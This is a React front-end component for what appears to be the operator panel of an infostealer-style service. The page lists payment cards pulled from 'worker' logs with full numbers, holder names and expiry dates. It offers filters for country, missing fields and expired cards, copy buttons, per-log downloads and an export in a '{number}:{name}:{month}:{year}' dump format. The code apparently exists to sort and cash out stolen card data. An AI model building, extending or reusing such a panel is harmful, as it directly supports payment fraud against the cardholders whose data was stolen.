import React, { useEffect, useState } from 'react';
import ReactPaginate from 'react-paginate';
import DateRangePicker from 'react-bootstrap-daterangepicker';

import languagesTranslate from '../../common/languages'

import { connect } from 'react-redux';
import { parseDate } from '../../common/utils';
import { getOwnAllCards, changeAllCardsFilter } from '../../store/actions/logs.actions'
import { baseUrl } from '../../common/config';

export default connect((s) => ({
  user: s.user.state,
  allCards: s.logs.cards,
}), {
  getOwnAllCards,
  changeAllCardsFilter
})(
  ({
    CurrentLanguage_G,

    user,
    allCards,

    getOwnAllCards,
    changeAllCardsFilter
  }) => {
    const [CurrentPage, changeCurrentPage] = useState(1)
    const [Cards, changeCards] = useState([])
    const [Pattern, changePattern] = useState('{number}:{name}:{month}:{year}')

    const handlePageChange = (page) => {

      changeCurrentPage(page);

      if (allCards.state.length != allCards.all && CurrentPage == (Cards.length / 50) - 1)
        getOwnAllCards({
          ...allCards.filter,
          token: user.token,
          from: allCards.state.length
        })

    }

    useEffect(() => {
      let _allCards = [];

      for (let i = 0; i < allCards.state.length; i++)
        _allCards = [..._allCards, ...allCards.state[i].cards.map(v => ({ id: allCards.state[i].id, value: v }))]

      if (allCards.filter.name)
        _allCards = _allCards.filter(v => v.value.name == allCards.filter.name);

      if (allCards.filter.number)
        _allCards = _allCards.filter(v => v.value.card == allCards.filter.number);

      if (allCards.filter.emptyName)
        _allCards = _allCards.filter(v => !v.value.name);

      if (allCards.filter.emptyDate)
        _allCards = _allCards.filter(v => !v.value.month || !v.value.year);

      if (allCards.filter.hideOld)
        _allCards = _allCards.filter(v => parseInt(v.value.month) >= (new Date().getMonth() + 1) && parseInt(v.value.year) >= new Date().getFullYear());

      changeCards(_allCards)

    }, [allCards.state])

    useEffect(() => {
      getOwnAllCards({
        ...allCards.filter,
        country: allCards.filter.country == 'all' ? '' : allCards.filter.country,
        token: user.token
      })
    }, [allCards.filter])

    return (
      <section className="content">
        <div className="body_scroll">
          <div className="block-header">
            <div className="row">
              <div className="col-lg-7 col-md-6 col-sm-12">
                <h2>{languagesTranslate[CurrentLanguage_G].allCardsPage.header}</h2>
                <ul className="breadcrumb">
                  <li className="breadcrumb-item"><a href="index.html"><i className="zmdi zmdi-home"></i> RiseTop</a>
                  </li>
                  <li className="breadcrumb-item">{languagesTranslate[CurrentLanguage_G].allCardsPage.pathItem1}</li>
                  <li className="breadcrumb-item active">{languagesTranslate[CurrentLanguage_G].allCardsPage.pathItem2}</li>
                </ul>
                <button className="btn btn-primary btn-icon mobile_menu" type="button"><i
                  className="zmdi zmdi-sort-amount-desc"></i></button>
              </div>
            </div>
          </div>

          <div class="container-fluid">
            <div class="row clearfix">
              <div class="col-lg-12 col-md-12">
                <div class="card">
                  <div class="header">
                    <h2><strong>{languagesTranslate[CurrentLanguage_G].allCardsPage.cards}</strong></h2>
                  </div>
                  <div class="body">
                    <div class="row mb-2">
                      <div class="col-lg-2 pr-1 col-md-4">
                        <div class="form-group">
                          <input type="text" class="form-control" placeholder={languagesTranslate[CurrentLanguage_G].allCardsPage.id} value={allCards.filter.id} onChange={e => changeAllCardsFilter({ name: 'id', value: e.target.value })} />
                        </div>
                      </div>
                      <div class="col-lg-2 pr-1 pl-1 col-md-12">
                        <div class="form-group">
                          <select class="custom-select" value={allCards.filter.country} onChange={e => changeAllCardsFilter({ name: 'country', value: e.target.value })} >
                            <option value={'all'}>{languagesTranslate[CurrentLanguage_G].allCardsPage.allCountries}</option>
                            <option value={'US'}>US</option>
                            <option value={'RU'}>RU</option>
                            <option value={'KZ'}>KZ</option>
                          </select>
                        </div>
                      </div>
                      <div class="col-lg-2 pr-1 pl-1 col-md-4">
                        <div class="form-group">
                          <input type="text" class="form-control" placeholder={languagesTranslate[CurrentLanguage_G].allCardsPage.name} value={allCards.filter.name} onChange={e => changeAllCardsFilter({ name: 'name', value: e.target.value })} />
                        </div>
                      </div>
                      <div class="col-lg-2 pr-1 pl-1 col-md-4">
                        <div class="form-group">
                          <input type="text" class="form-control" placeholder={languagesTranslate[CurrentLanguage_G].allCardsPage.number} value={allCards.filter.number} onChange={e => changeAllCardsFilter({ name: 'number', value: e.target.value })} />
                        </div>
                      </div>
                      <div class="col-lg-1 pr-1 pl-1 col-md-0" />
                      <div class="col-lg-3 pr-1 pl-1 col-md-0">
                        <div className="d-flex justify-content-end w-100">
                          <div class="form-group w-100">
                            <input type="text" class="form-control" placeholder="{number}:{name}:{month}:{year}" value={Pattern} onChange={e => changePattern(e.target.value)} />
                          </div>
                          <a href={`${baseUrl}logs/download-cards?_id=${user._id}&id=${allCards.filter.id}&country=${allCards.filter.country == 'all' ? '' : allCards.filter.country}&name=${allCards.filter.name}&number=${allCards.filter.number}&dateFrom=${allCards.filter.dateFrom}&dateTo=${allCards.filter.dateTo}&emptyName=${allCards.filter.emptyName}&emptyDate=${allCards.filter.emptyDate}&hideOld=${allCards.filter.hideOld}&pattern=${Pattern}`} download className={'mb-3'}>
                            <button type="button" class="btn btn-primary mt-0 mb-0 h-100">
                              <span class="btn-label">
                                <i class="zmdi zmdi-download"></i>
                              </span>
                            </button>
                          </a>
                        </div>
                      </div>
                      <div class="col-lg-3 pr-1 col-md-12">
                        <DateRangePicker
                          initialSettings={{ startDate: allCards.filter.dateFrom ? new Date(allCards.filter.dateFrom) : new Date(), endDate: allCards.filter.dateTo ? new Date(allCards.filter.dateTo) : new Date() }}
                          onApply={(event, { startDate, endDate }) => {
                            changeAllCardsFilter({ name: 'dateFrom', value: startDate.toDate() })
                            changeAllCardsFilter({ name: 'dateTo', value: endDate.toDate() })
                          }}
                        >
                          <div>
                            <div class="input-group">
                              <div class="input-group-prepend">
                                <span class="input-group-text" id="">{languagesTranslate[CurrentLanguage_G].WorkersLogsPage.date}</span>
                              </div>
                              <input type="text" class="form-control" readOnly value={parseDate(allCards.filter.dateFrom)} />
                              <input type="text" class="form-control" readOnly value={parseDate(allCards.filter.dateTo)} />
                            </div>
                          </div>
                        </DateRangePicker>
                      </div>
                      <div class="col-lg-8 pr-1 col-md-4">
                        <div class="form-check form-check-inline">
                          <input class="form-check-input" type="checkbox" id="inlineCheckbox1" value="option1" checked={allCards.filter.emptyName} onChange={e => changeAllCardsFilter({ name: 'emptyName', value: e.target.checked ? true : '' })} />
                          <label class="form-check-label" for="inlineCheckbox1">{languagesTranslate[CurrentLanguage_G].allCardsPage.emprtyName}</label>
                        </div>
                        <div class="form-check form-check-inline">
                          <input class="form-check-input" type="checkbox" id="inlineCheckbox2" value="option1" checked={allCards.filter.hideOld} onChange={e => changeAllCardsFilter({ name: 'hideOld', value: e.target.checked ? true : '' })} />
                          <label class="form-check-label" for="inlineCheckbox2">{languagesTranslate[CurrentLanguage_G].allCardsPage.hideOld}</label>
                        </div>
                        <br />
                        <div class="form-check form-check-inline">
                          <input class="form-check-input" type="checkbox" id="inlineCheckbox3" value="option1" checked={allCards.filter.emptyDate} onChange={e => changeAllCardsFilter({ name: 'emptyDate', value: e.target.checked ? true : '' })} />
                          <label class="form-check-label" for="inlineCheckbox3">{languagesTranslate[CurrentLanguage_G].allCardsPage.emptyDate}</label>
                        </div>
                      </div>
                    </div>
                    <div className="row">
                      <div className="col-6">
                        <div className="w-100 h-100 d-flex align-items-center">
                          <span className={'text-muted'}>{languagesTranslate[CurrentLanguage_G].allCardsPage.show(((CurrentPage - 1) * 50) + 1, CurrentPage * 50, allCards.all)}</span>
                        </div>
                      </div>
                      <div className="col-6">
                        <ReactPaginate
                          previousLinkClassName={'btn btn-secondary previous'}
                          previousLabel={languagesTranslate[CurrentLanguage_G].WorkersLogsPage.previous}
                          nextLinkClassName={'btn btn-secondary next'}
                          nextLabel={languagesTranslate[CurrentLanguage_G].WorkersLogsPage.next}
                          breakLabel={'...'}
                          breakClassName={'break-me'}
                          pageCount={Math.ceil(allCards.all / 25)}
                          marginPagesDisplayed={2}
                          pageRangeDisplayed={5}
                          onPageChange={(page) => handlePageChange(page.selected + 1)}
                          containerClassName={'pagination justify-content-end'}
                          activeClassName={'active'}
                          pageLinkClassName={'num'}
                        />
                      </div>
                    </div>
                    <table class="table table-bordered">
                      <thead>
                        <tr>
                          <th></th>
                          <th>{languagesTranslate[CurrentLanguage_G].allCardsPage.id}</th>
                          <th>{languagesTranslate[CurrentLanguage_G].allCardsPage.number}</th>
                          <th>{languagesTranslate[CurrentLanguage_G].allCardsPage.name}</th>
                          <th>{languagesTranslate[CurrentLanguage_G].allCardsPage.date}</th>
                        </tr>
                      </thead>
                      <tbody>
                        {
                          Cards.map((v, i) =>
                            i < CurrentPage * 50 && i >= (CurrentPage - 1) * 50
                              ? <tr key={i}>
                                <th scope="row" className={"text-center"}>
                                  <a href={`${baseUrl}logs/download-log?_id=${user._id}&id=${v.id}`}>
                                    <button class="btn btn-primary">
                                      <span class="btn-label">
                                        <i class="zmdi zmdi-download"></i>
                                      </span>
                                    </button>
                                  </a>
                                </th>
                                <td className={'text-center'}>
                                  {v.id}
                                </td >
                                <td style={{ maxWidth: '200px' }} className={'text-center'}>
                                  <span>{v.value.card}<i onClick={() => navigator.clipboard.writeText(v.value.card)} class="cursor-pointer ml-2 zmdi zmdi-copy"></i></span>
                                </td >
                                <td className={'text-center'}>
                                  <span>{v.value.name}{v.value.name ? <i onClick={() => navigator.clipboard.writeText(v.value.name)} class="cursor-pointer ml-2 zmdi zmdi-copy"></i> : null}</span>
                                </td >
                                <td className={'text-center'}>
                                  {v.value.month}/{v.value.year}
                                </td >
                              </tr>
                              : null
                          )
                        }
                      </tbody>
                    </table>
                  </div>
                </div>
              </div>
            </div>
          </div>

        </div>
      </section >
    )

  }
);